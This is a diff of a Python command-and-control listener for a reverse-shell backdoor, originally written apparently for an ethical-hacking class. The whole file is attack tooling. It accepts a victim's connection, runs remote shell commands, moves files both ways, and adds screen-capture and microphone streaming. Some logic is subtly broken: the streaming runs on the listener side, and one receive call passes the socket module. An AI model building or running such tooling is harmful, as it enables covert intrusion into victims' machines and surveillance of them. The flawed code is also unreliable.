@@ -1,109 +1,228 @@
-################################################
-# Author: Watthanasak Jeamwatthanachai, PhD    #
-# Class: SIIT Ethical Hacking, 2023-2024       #
-################################################
+import socket
+import json
+import os
+import threading
+import cv2
+import pyautogui
+import mss
+import numpy as np
+import struct
+import pyaudio
+import time
 
-# Import necessary libraries
-import socket  # This library is used for creating socket connections.
-import json  # JSON is used for encoding and decoding data in a structured format.
-import os  # This library allows interaction with the operating system.
+target_ip = '127.0.0.1'  # Replace with server IP address
+target_port = 5005
+video_port = 9999
+audio_port = 6666
 
-target_ip = '127.0.0.1'
-target_port = 5555
+# Constants
+CHUNK = 1024
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
 
 # Function to send data reliably as JSON-encoded strings
-def reliable_send(data):
-    # Convert the input data into a JSON-encoded string.
+def reliable_send(socket, data):
     jsondata = json.dumps(data)
-    # Send the JSON-encoded data over the network connection after encoding it as bytes.
-    target.send(jsondata.encode())
-
+    socket.send(jsondata.encode())
 
 # Function to receive data reliably as JSON-decoded strings
-def reliable_recv():
+def reliable_recv(socket):
     data = ''
     while True:
         try:
-            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
-            # and remove any trailing whitespace characters.
-            data = data + target.recv(1024).decode().rstrip()
-            # Parse the received data as a JSON-decoded object.
+            data = data + socket.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
 
-
 # Function to upload a file to the target machine
-def upload_file(file_name):
-    # Open the specified file in binary read ('rb') mode.
-    f = open(file_name, 'rb')
-    # Read the contents of the file and send them over the network connection to the target.
-    target.send(f.read())
-
+def upload_file(socket, file_name):
+    try:
+        f = open(file_name, 'rb')
+        socket.send(f.read())
+    except FileNotFoundError as e:
+        print(e)
 
 # Function to download a file from the target machine
-def download_file(file_name):
-    # Open the specified file in binary write ('wb') mode.
-    f = open(file_name, 'wb')
-    # Set a timeout for receiving data from the target (1 second).
-    target.settimeout(1)
-    chunk = target.recv(1024)
-    while chunk:
-        # Write the received data (chunk) to the local file.
-        f.write(chunk)
-        try:
-            # Attempt to receive another chunk of data from the target.
-            chunk = target.recv(1024)
-        except socket.timeout as e:
-            break
-    # Reset the timeout to its default value (None).
-    target.settimeout(None)
-    # Close the local file after downloading is complete.
-    f.close()
+def download_file(socket, file_name):
+    # Set a timeout for receiving data from the socket (1 second).
+    socket.settimeout(1)
+    
+    try:
+        first_chunk = socket.recv(1024)
+        # Check for error message
+        if first_chunk.startswith(b"ERROR:"):
+            print(first_chunk.decode())
+            return
+        
+        # Open the specified file in binary write ('wb') mode only if the first chunk is valid
+        with open(file_name, 'wb') as f:
+            f.write(first_chunk)
+            
+            while True:
+                try:
+                    chunk = socket.recv(1024)
+                    if not chunk:
+                        break
+                    f.write(chunk)
+                except TimeoutError:
+                    break
+    except Exception as e:
+        print(f"Error occurred while downloading {file_name}: {str(e)}")
+    finally:
+        # Reset the timeout to its default value (None).
+        socket.settimeout(None)
+
+
 
 
 # Function for the main communication loop with the target
-def target_communication():
+def target_communication(target):
     dir = ''
     while True:
-        # Prompt the user for a command to send to the target.
-        command = input(f'* Shell~{str(ip)}: {dir}$ ')
-        # Send the user's command to the target using the reliable_send function.
-        reliable_send(command)
+        command = input(f'* Shell~{str(target_ip)}: {dir}$ ')
+        reliable_send(target, command)
+
+        # Common command
         if command == 'quit':
-            # If the user enters 'quit', exit the loop and close the connection.
             break
         elif command == 'clear':
-            # If the user enters 'clear', clear the terminal screen.
             os.system('clear')
         elif command[:3] == 'cd ':
-            # If the user enters 'cd', change the current directory on the target.
-            dir = reliable_recv() + ' '
+            recv_data = reliable_recv(target)
+            err = recv_data['stderr']
+            if err:
+                print(err)
+            else:
+                dir = recv_data['stdout'] + ' '
         elif command[:8] == 'download':
-            # If the user enters 'download', initiate the download of a file from the target.
-            download_file(command[9:])
+            download_file(target, command[9:])
         elif command[:6] == 'upload':
-            # If the user enters 'upload', initiate the upload of a file to the target.
-            upload_file(command[7:])
+            upload_file(target, command[7:])
+
+        # Screen Streaming
+        elif command == 'endscreen':
+            screen_socket.close()
+        elif command == 'endaudio':
+            audio_socket.close()
+        elif command == 'endscreenstream':
+            screen_socket.close()
+            audio_socket.close()
+        # Command handling part
+        elif command == 'screen':
+            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            screen_socket.bind((target_ip, video_port))
+            screen_socket.listen(1)  # Listen for one connection
+            print("Screen server listening at:", (target_ip, video_port))
+
+            client_socket, addr = screen_socket.accept()  # Accept the incoming connection
+            print("Connection from:", addr)
+
+            screen_thread = threading.Thread(target=screen_stream, args=(client_socket,))
+            screen_thread.start()
+            screen_thread.join()  # Wait for screen streaming to finish
+
+        elif command == 'audio':
+            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            audio_socket.bind((target_ip, audio_port))
+            audio_socket.listen(5)
+            print("Audio server listening at:", (target_ip, audio_port))
+
+            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
+            audio_thread.start()
+            audio_thread.join()  # Wait for audio streaming to finish
+        elif command == 'screen+audio':
+            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            screen_socket.bind((target_ip, video_port))
+            screen_socket.listen(5)
+            print("Screen server listening at:", (target_ip, video_port))
+            
+            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            audio_socket.bind((target_ip, audio_port))
+            audio_socket.listen(5)
+            print("Audio server listening at:", (target_ip, audio_port))
+            
+            screen_thread = threading.Thread(target=screen_stream, args=(screen_socket,))
+            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
+            screen_thread.start()
+            audio_thread.start()
+            screen_thread.join()  # Wait for screen streaming to finish
+            audio_thread.join()   # Wait for audio streaming to finish
+        
+        # Others
         else:
-            # For other commands, receive and print the result from the target.
-            result = reliable_recv()
+            result = reliable_recv(socket)
             print(result)
 
+# Function to stream screen content
+def screen_stream(client_socket):
+    w, h = pyautogui.size()
+    monitor = {"top": 0, "left": 0, "width": w, "height": h}
+    
+    try:
+        t0 = time.time()
+        n_frames = 1
+        with mss.mss() as sct:
+            while True:
+                screen = sct.grab(monitor)
+                frame = np.array(screen)
+                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
+                message = struct.pack(">L", len(buffer)) + buffer.tobytes()
+                try:
+                    client_socket.sendall(message)
+                except BrokenPipeError:
+                    print("Broken pipe error, connection lost.")
+                    break
 
-# Create a socket for the server
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                elapsed_time = time.time() - t0
+                avg_fps = (n_frames / elapsed_time)
+                print("Screen Average FPS: " + str(avg_fps))
+                n_frames += 1
+    except KeyboardInterrupt:
+        print("Stopped by user.")
+    finally:
+        client_socket.close()
 
-# Bind the socket to a specific IP address and port.
-sock.bind((target_ip, target_port))
+# Function to stream audio content
+def audio_stream(client_socket):
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    input=True,
+                    frames_per_buffer=CHUNK)
+    
+    try:
+        while True:
+            data = stream.read(CHUNK, exception_on_overflow=False)
+            client_socket.sendall(data)
+    except KeyboardInterrupt:
+        print("Stopped by user.")
+    finally:
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        client_socket.close()
 
-# Start listening for incoming connections (maximum 5 concurrent connections).
-print('[+] Listening For The Incoming Connections')
-sock.listen(5)
+def main():
+    # Create a socket for the server
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind((target_ip, target_port))
+    sock.listen(5)
+    print('[+] Listening For The Incoming Connections')
 
-# Accept incoming connection from the target and obtain the target's IP address.
-target, ip = sock.accept()
-print('[+] Target Connected From: ' + str(ip))
+    # Accept incoming connection from the target
+    target, ip = sock.accept()
+    print('[+] Target Connected From: ' + str(ip))
 
-# Start the main communication loop with the target by calling target_communication.
-target_communication()
+    # Start the main communication loop with the target
+    target_comm_thread = threading.Thread(target=target_communication, args=(target,))
+    target_comm_thread.start()
+    target_comm_thread.join()
+
+    # Close the server socket
+    sock.close()
+
+if __name__ == "__main__":
+    main()
